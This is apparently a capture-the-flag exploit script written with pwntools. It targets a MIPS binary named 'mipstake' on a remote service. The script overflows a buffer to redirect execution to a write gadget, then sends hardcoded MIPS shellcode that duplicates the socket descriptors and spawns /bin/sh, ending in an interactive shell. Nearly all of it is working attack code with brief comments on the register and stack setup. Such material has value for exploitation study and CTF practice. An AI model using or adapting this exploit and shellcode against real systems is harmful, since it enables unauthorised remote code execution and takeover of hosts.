from pwn import *
elf = context.binary = ELF("/home/mipstake/mipstake")
#elf = context.binary = ELF("./mipstake")
io = remote("0",9033)

# Stage 1: Store shellcode in the mmaped area
# returning to 0x0040095c gives us a write-what-where
# $a1 = client_socket
# $a2 = controlled address (fp, s8)
# $a3 = size (0x2000)

# Stage 2: Return to shellcode
# $ra ends pointing to 0x66666000 + 0x18
# the client socket is stored in $a0, we need to duplicate the fds in order to get a shell
# $sp ends pointing to 0x66666000 too, the shellcode needs to use -offset($sp), we need to change the position to avoid a SEGFAULT

padding = b"A"*16 + p32(0x66666000-0x18) # fp

payload = padding 
payload += p32(0x0040095c)
#payload += p32(0x41414141)

#payload2 =  p32(0x66666000 + 0x18) * (0x18//4) 
#payload2 += asm("addiu $sp, $sp, 0x600")
#payload2 += asm(shellcraft.dupsh(sock='$a0'))
payload2 = b"ff`\x18ff`\x18ff`\x18ff`\x18ff`\x18ff`\x18'\xbd\x06\x00$\x19\xff\xfd\x03 \x10'\xaf\xa2\xff\xfc\x8f\xa5\xff\xfc4\x02\x0f\xdf\x01\x01\x01\x0c\x1c@\xff\xfb B\xff\xff<\t//5)bi\xaf\xa9\xff\xf4<\tn/5)sh\xaf\xa9\xff\xf8\xaf\xa0\xff\xfc'\xbd\xff\xf4\x03\xa0  <\x19\x8c\x9779\xff\xff\x03 H'\xaf\xa9\xff\xfc'\xbd\xff\xfc(\x05\xff\xff\xaf\xa5\xff\xfc#\xbd\xff\xfc$\x19\xff\xfb\x03 ('\x03\xa5( \xaf\xa5\xff\xfc#\xbd\xff\xfc\x03\xa0( \xaf\xa0\xff\xfc'\xbd\xff\xfc(\x06\xff\xff\xaf\xa6\xff\xfc#\xbd\xff\xfc\x03\xa00 4\x02\x0f\xab\x01\x01\x01\x0c"

sleep(0.5)
io.sendline(payload)

sleep(0.5)
io.sendline(payload2)

print(payload2)
# win
io.interactive()



